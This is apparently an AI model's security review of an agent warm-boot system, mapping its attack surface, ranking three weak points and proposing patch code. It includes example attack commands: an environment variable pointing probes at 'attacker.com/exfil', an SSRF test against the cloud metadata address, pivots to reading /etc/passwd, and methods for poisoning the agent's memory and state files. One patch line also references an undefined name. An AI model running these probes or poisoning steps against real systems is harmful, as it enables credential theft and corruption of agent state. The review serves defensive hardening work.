# PA-S1boot-kimik2 (moonshotai/kimi-k2 @ nous, turn 1, channel: content)

(1) ATTACK SURFACE MAP

READ ACCESS EXPLOITATION:

- secrets: none found in boot path files. MAG_DEPLOYMENTS env var checked at 00__hermes_warm_boot.py:72 but not logged; _DEFAULT_KNOWN_URLS at 00__hermes_warm_boot.py:56-58 contains one Vercel URL with project slug `mag-d961` - project naming convention leaks.

- URLs: _DEFAULT_KNOWN_URLS hardcoded Vercel deployment URL at 00__hermes_warm_boot.py:56-58; _deployment_urls() reads configs/deployments.json at 00__hermes_warm_boot.py:86-93; DEPLOY directory scanned at 00__hermes_warm_boot.py:102-105 for .html/.json/.md files - file enumeration surface.

- keys: no cryptographic keys in boot configs. CHAIN path (memory/biography/verkle_chain.jsonl) and STATE path (memory/warm_state.json) exposed at 00__hermes_warm_boot.py:48-49.

- session bleed: warm_state.json written with full chain tip + deployment registry + session brief at 00__hermes_warm_boot.py:232; file readable by any process with filesystem access after boot.

- context pack leakage: MODE_CONFIG dict at 04__context_pack.py:78-179 contains internal budget allocations (max_chars per mode) - reveals token economics to competitors.

WRITE ACCESS POISONING (memlance weapon):

- STATE file (memory/warm_state.json) at 00__hermes_warm_boot.py:49 - poison here changes every downstream seat's warm boot perception of chain tip and deployment state. No signature verification on read (verify only validates, does not gate write).

- DEPLOYMENTS_CONFIG (configs/deployments.json) at 00__hermes_warm_boot.py:86 - poison here injects malicious URLs into known_urls list, surfaces in warm_state.json, propagates to --check-deployments probes.

- CHAIN file (memory/biography/verkle_chain.jsonl) at 00__hermes_warm_boot.py:48 - append malicious JSON line, _chain_tip() reads last line at 00__hermes_warm_boot.py:61 without integrity check beyond JSON parse.

- BRIEF file (memory/briefs/latest.md) at 00__hermes_warm_boot.py:51 - poison session brief content read into warm_state.json.

- PACK_OFFLOAD_FILE (watch/inbox/PACK_OFFLOAD.jsonl) at 04__context_pack.py:35 - append-only poison of pack shed telemetry.

(2) THE 3 WEAKEST JOINTS

RANK 1: Unvalidated chain tip ingestion - _chain_tip() at 00__hermes_warm_boot.py:54-70 reads last line of CHAIN file, parses JSON, extracts fields without schema validation or cryptographic verification. Exploit: append single crafted JSON line to verkle_chain.jsonl with malicious verkle_root, seat accepts false chain state. Falsifier: any row with n_leaves > plausible maximum or verkle_root not matching hex pattern should reject.

RANK 2: Deployment URL injection via config precedence - _deployment_urls() at 00__hermes_warm_boot.py:71-99 accepts MAG_DEPLOYMENTS env var (JSON list or dict) overriding file config, with only type checking (isinstance list, all strings) at 00__hermes_warm_boot.py:80-81. Exploit: set MAG_DEPLOYMENTS='["https://attacker.com/exfil"]' before boot, seat probes attacker-controlled URL on --check-deployments, exfiltrates probe timing/headers. Falsifier: URL scheme whitelist missing - http://, file://, //evil.com all pass.

RANK 3: Warm state write without integrity guard - warm_boot() writes STATE file at 00__hermes_warm_boot.py:232 with json.dumps(state, indent=2) - no HMAC, no signature, no atomic write (write_text non-atomic on most platforms). Exploit: race condition or direct overwrite of warm_state.json between boot and seat read; seat consumes attacker-controlled state. Falsifier: no checksum in file, no separate .sig file, no size sanity bound.

(3) PATCH SPEC

JOINT 1 PATCH (chain tip validation):

```
# 00__hermes_warm_boot.py, insert after line 54, before _chain_tip definition

_VERKLE_ROOT_RE = re.compile(r"^[0-9a-f]{64}$", re.IGNORECASE)
_MAX_LEAVES_SANE = 1_000_000  # instrument: moment 2026-10-01, context: Verkle tree capacity

def _validate_knot(knot: dict) -> tuple[bool, str]:
    root = knot.get("verkle_root", "")
    if not _VERKLE_ROOT_RE.match(root):
        return False, f"verkle_root malformed: {root[:20]}..."
    n_leaves = knot.get("n_leaves")
    if not isinstance(n_leaves, int) or n_leaves < 0 or n_leaves > _MAX_LEAVES_SANE:
        return False, f"n_leaves out of sane bounds: {n_leaves}"
    return True, ""

# Modify _chain_tip() lines 61-69: after json.loads, call _validate_knot, return error dict on False
```

JOINT 2 PATCH (deployment URL scheme whitelist):

```
# 00__hermes_warm_boot.py, insert after line 71 in _deployment_urls

_ALLOWED_SCHEMES = {"https"}
_MAX_URL_LEN = 2048

def _sanitize_url(u: str) -> tuple[str | None, str | None]:
    if len(u) > _MAX_URL_LEN:
        return None, f"URL exceeds {MAX_URL_LEN} chars"
    from urllib.parse import urlparse
    parsed = urlparse(u)
    if parsed.scheme not in _ALLOWED_SCHEMES:
        return None, f"scheme {parsed.scheme} not allowed"
    if not parsed.netloc or "." not in parsed.netloc:
        return None, f"missing or invalid netloc"
    return u, None

# Modify line 80: after candidate extraction, filter:
# candidate = [u for u in candidate if _sanitize_url(u)[0] is not None]
# notes.extend errors from _sanitize_url
```

JOINT 3 PATCH (atomic signed warm state):

```
# 00__hermes_warm_boot.py, replace line 232 STATE.write_text block

import tempfile, os, hmac, hashlib

def _write_warm_state_atomic(path: Path, state: dict, key: bytes | None = None) -> None:
    payload = json.dumps(state, indent=2).encode("utf-8")
    sig = hmac.new(key or b"", payload, hashlib.sha256).hexdigest()[:32] if key else "UNSIGNED"
    blob = payload + b"\n# sig:" + sig.encode() + b"\n"
    with tempfile.NamedTemporaryFile(dir=path.parent, delete=False, suffix=".tmp") as tf:
        tf.write(blob)
        tmp_path = Path(tf.name)
    os.replace(tmp_path, path)

# Call: _write_warm_state_atomic(STATE, state, key=os.environ.get("MAG_WARM_KEY", "").encode())
```

(4) Q50 REHEARSAL: FIRST TEST

First test: `MAG_DEPLOYMENTS='["http://169.254.169.254/latest/meta-data/"]' python -m mag.hermes_warm_boot --check-deployments`

Why: confirms Joint 2 (URL scheme whitelist absence) is exploitable for SSRF/metadata service access. If probe attempts connection to link-local address, boot path lacks egress controls. Expected: current code accepts http:// scheme, attempts HEAD probe, timeout or metadata leak. Falsifier: if environment blocks link-local, pivot to `file:///etc/passwd` or DNS rebinding via `http://attacker.com` with 302 redirect to metadata.
